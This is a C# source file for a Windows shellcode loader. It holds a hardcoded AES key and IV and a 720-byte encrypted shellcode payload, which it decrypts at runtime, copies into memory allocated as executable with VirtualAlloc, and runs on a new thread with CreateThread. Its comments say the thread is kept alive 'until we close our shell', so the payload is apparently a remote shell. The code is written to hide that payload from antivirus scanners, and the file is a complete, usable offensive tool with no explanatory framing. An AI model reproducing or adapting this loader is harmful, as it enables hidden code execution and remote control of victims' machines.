using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace StayAwhile
{
    class AndListen
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // Key bytes
            byte[] Says = new byte[32] {
                0xe8, 0xf2, 0x36, 0x6b, 0x0e, 0x06, 0x63, 0xee, 0x33, 0xcf, 0xf9, 0xb9, 0x03, 0x3c, 0x3f,
                0x6f, 0x3d, 0x17, 0xd3, 0x4a, 0x00, 0x8e, 0x3b, 0x47, 0xfa, 0x31, 0x7b, 0xb9, 0x64, 0x7a,
                0x68, 0x5b };

            // IV bytes
            byte[] Try = new byte[16] {
                0x50, 0x83, 0x03, 0x31, 0x1e, 0x6a, 0x40, 0xe2, 0xae, 0x7f, 0xc5, 0x96, 0x7a, 0x5d, 0x9b, 0xa8 };

            // AES 128-bit encrypted shellcode
            byte[] OffSec = new byte[720] {
                0x8f, 0xe7, 0xfa, 0x1c, 0x52, 0x4b, 0xf1, 0x07, 0x39, 0xfd, 0x3e, 0x62, 0x66, 0xb6, 0x80,
                0xdc, 0x28, 0x23, 0x3f, 0xe2, 0xfe, 0xaa, 0x2f, 0x9f, 0xa4, 0x70, 0x9a, 0xca, 0x23, 0x32,
                0x03, 0xc7, 0xde, 0x3f, 0x41, 0x8d, 0xe6, 0x36, 0x98, 0x31, 0x36, 0x1a, 0xa0, 0x8f, 0x0e,
                0x24, 0xfb, 0x3c, 0x1f, 0x95, 0x9e, 0x66, 0xdc, 0x7b, 0x9d, 0x89, 0xd2, 0x3f, 0xa0, 0x48,
                0x90, 0x37, 0x8d, 0x98, 0x24, 0x9f, 0xcb, 0xaa, 0x35, 0xff, 0xb5, 0xcd, 0x01, 0x87, 0xd1,
                0x32, 0x2d, 0xe3, 0x57, 0x50, 0xcc, 0x11, 0x72, 0x8d, 0x6a, 0xfb, 0x52, 0xe9, 0xd2, 0x33,
                0x69, 0x57, 0x9d, 0x98, 0x2b, 0xe3, 0xf6, 0x7b, 0xfb, 0xfe, 0x92, 0x54, 0x22, 0x30, 0x1b,
                0xbd, 0x1f, 0xd7, 0x2e, 0x54, 0xb7, 0xa8, 0x23, 0x92, 0x21, 0x5f, 0xd2, 0x33, 0x16, 0x1c,
                0x9d, 0x4e, 0x9d, 0xb3, 0xf4, 0x08, 0xa3, 0x54, 0x15, 0x23, 0x00, 0xb4, 0x42, 0xc4, 0x97,
                0x6f, 0xfe, 0x01, 0x4c, 0xc1, 0xe1, 0xd6, 0xcf, 0x38, 0x02, 0x01, 0x4d, 0x2f, 0x15, 0x57,
                0x5d, 0xf8, 0xe3, 0xbc, 0x77, 0xca, 0x61, 0xe6, 0xfa, 0x32, 0x43, 0xf7, 0xa8, 0x9d, 0x68,
                0xc6, 0x37, 0x22, 0xdd, 0x06, 0xee, 0x1f, 0x61, 0x74, 0x46, 0xb0, 0xef, 0x36, 0x5c, 0xb9,
                0x12, 0x0e, 0x2d, 0xeb, 0x84, 0x74, 0x73, 0xf1, 0x78, 0x09, 0x2f, 0xc5, 0xf8, 0xc8, 0xc2,
                0x8d, 0xc4, 0xa6, 0x81, 0xf5, 0x12, 0xf7, 0xd7, 0x60, 0x28, 0x78, 0xb1, 0x06, 0xee, 0x36,
                0x14, 0xc1, 0xb0, 0x76, 0x49, 0x7b, 0xe8, 0x3a, 0x25, 0x86, 0xf2, 0x86, 0x9d, 0x45, 0x68,
                0xa5, 0x29, 0x12, 0xd9, 0x9f, 0x92, 0x23, 0xf4, 0xaa, 0xbc, 0x4f, 0xd7, 0xcd, 0x24, 0xed,
                0x35, 0xcd, 0x66, 0xbe, 0x40, 0xed, 0xac, 0x04, 0x2f, 0x22, 0xe1, 0xd2, 0x3d, 0x6d, 0x73,
                0xc8, 0x14, 0xae, 0xa9, 0x38, 0xef, 0xda, 0xe7, 0x36, 0x63, 0xd9, 0xfa, 0x14, 0x3d, 0xd6,
                0x04, 0xc5, 0x6e, 0x05, 0x89, 0x04, 0x8d, 0xaa, 0xcf, 0x86, 0xa4, 0xa0, 0xeb, 0xd0, 0x8c,
                0x0d, 0xd8, 0x8a, 0x5d, 0xf9, 0xa1, 0xe8, 0x99, 0xef, 0x04, 0xf7, 0xa7, 0xa4, 0xdc, 0x96,
                0xaf, 0x24, 0x30, 0xd8, 0x6c, 0x8c, 0x69, 0xdd, 0x38, 0xc5, 0x2d, 0xc0, 0xc8, 0x27, 0x11,
                0x25, 0xd3, 0xdc, 0xdb, 0x17, 0xe1, 0x8f, 0x3c, 0x00, 0xe3, 0x7c, 0x90, 0x2e, 0x78, 0x3c,
                0xa3, 0x28, 0x55, 0x3b, 0x36, 0xc7, 0xa6, 0xc7, 0x56, 0x77, 0xe9, 0x88, 0xcd, 0xc6, 0x12,
                0x77, 0x3b, 0x63, 0x1e, 0xdf, 0xc3, 0x8e, 0xb8, 0xd0, 0xbf, 0x88, 0x70, 0xd3, 0x65, 0x89,
                0x49, 0x5c, 0x4f, 0x70, 0x5f, 0xcd, 0x12, 0x75, 0xb5, 0x91, 0x04, 0xc2, 0x64, 0xd1, 0x4e,
                0x0e, 0x77, 0xb6, 0xc7, 0xab, 0xcb, 0x0b, 0xd2, 0x0a, 0x3f, 0x96, 0x85, 0x49, 0x73, 0x8c,
                0x5a, 0x47, 0x46, 0x04, 0x5d, 0x1e, 0x37, 0x75, 0x27, 0x8d, 0x5a, 0x92, 0x4e, 0x3c, 0xd1,
                0xaa, 0x66, 0x10, 0xbe, 0x6c, 0x7f, 0x99, 0x25, 0x56, 0x65, 0xd0, 0xf3, 0xdf, 0x9d, 0x8e,
                0x03, 0x76, 0x08, 0x81, 0x32, 0x12, 0xee, 0xb0, 0x7b, 0xf0, 0x6f, 0x8d, 0xa8, 0x88, 0xc0,
                0x7c, 0x7c, 0x36, 0x7f, 0xe7, 0x90, 0x26, 0x5e, 0x7b, 0xa9, 0x29, 0x9b, 0x8c, 0x9b, 0x66,
                0x6f, 0x68, 0x7e, 0x2c, 0x32, 0xcc, 0xda, 0xf2, 0x7a, 0x16, 0x23, 0x80, 0xb9, 0x0c, 0x56,
                0xe3, 0x15, 0xa7, 0x32, 0x47, 0xf6, 0xcb, 0x8b, 0x54, 0xe3, 0xf4, 0x50, 0x94, 0x74, 0xbd,
                0x2e, 0xb5, 0xb8, 0xf8, 0x40, 0x85, 0xd5, 0x3a, 0x0b, 0xb2, 0x68, 0x24, 0xff, 0xa2, 0xe5,
                0x4e, 0x30, 0x83, 0xb5, 0xb1, 0x9c, 0x7a, 0x97, 0x6c, 0x2f, 0xf2, 0x93, 0xfa, 0x18, 0x5b,
                0x27, 0x93, 0xda, 0x69, 0x1f, 0x14, 0xd3, 0x9a, 0x12, 0xed, 0xdd, 0x79, 0x62, 0x2a, 0x0c,
                0x92, 0x8b, 0x37, 0xe3, 0x22, 0x8f, 0x89, 0x72, 0x61, 0xc8, 0x1c, 0x47, 0xb6, 0x45, 0x21,
                0x57, 0x92, 0x33, 0xc0, 0xc5, 0x18, 0xa9, 0x63, 0x61, 0x83, 0xe6, 0xc3, 0xeb, 0x7b, 0xe1,
                0x17, 0x00, 0x99, 0x15, 0x59, 0x41, 0x3f, 0x4f, 0x82, 0xc8, 0xab, 0x74, 0x8e, 0xc0, 0x39,
                0x0c, 0x06, 0x16, 0xe8, 0x1a, 0x47, 0xa7, 0x77, 0x0f, 0x4a, 0x18, 0x3f, 0x4c, 0x05, 0xff,
                0xc5, 0xf3, 0x2c, 0x83, 0x3e, 0x33, 0xc8, 0x66, 0xe9, 0x66, 0xc3, 0x55, 0x28, 0x0e, 0xca,
                0x18, 0x8c, 0xaf, 0x0c, 0x7b, 0xb3, 0x0b, 0xc6, 0xdd, 0xe3, 0xf6, 0x84, 0x30, 0x01, 0x09,
                0x80, 0x6f, 0x70, 0x24, 0xa5, 0x59, 0xbb, 0x42, 0x50, 0x80, 0xd0, 0x7c, 0xbe, 0x76, 0x07,
                0x6b, 0x7c, 0x5f, 0x7c, 0xca, 0x90, 0x8d, 0x82, 0x22, 0x87, 0x21, 0x39, 0xfd, 0x45, 0x1f,
                0xc5, 0xb0, 0x74, 0x9c, 0x77, 0xd1, 0x3a, 0x4f, 0xa9, 0x34, 0xdd, 0xc7, 0x4d, 0xb4, 0xb5,
                0x22, 0x8f, 0xc7, 0xea, 0x9d, 0x83, 0x78, 0xac, 0x69, 0x97, 0x6a, 0x02, 0xae, 0x85, 0x00,
                0x4e, 0xf2, 0xb7, 0xe7, 0x26, 0x56, 0x8b, 0x1a, 0xa3, 0x1d, 0xc7, 0x72, 0xd8, 0xab, 0x4e,
                0x14, 0xe2, 0xec, 0xe6, 0x4d, 0x37, 0x76, 0x09, 0x75, 0x1a, 0x31, 0xa5, 0x8a, 0x76, 0x97,
                0x09, 0x6e, 0x19, 0xfb, 0xce, 0x1f, 0x2f, 0xa9, 0x19, 0x37, 0x86, 0xee, 0x56, 0xfb, 0x83
                 };

            // Decrypt our shellcode
            var crypto = new AndListen();
            byte[] Harder = crypto.Decrypt(OffSec, Says, Try);
            int size = Harder.Length;

            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(Harder, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);

            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
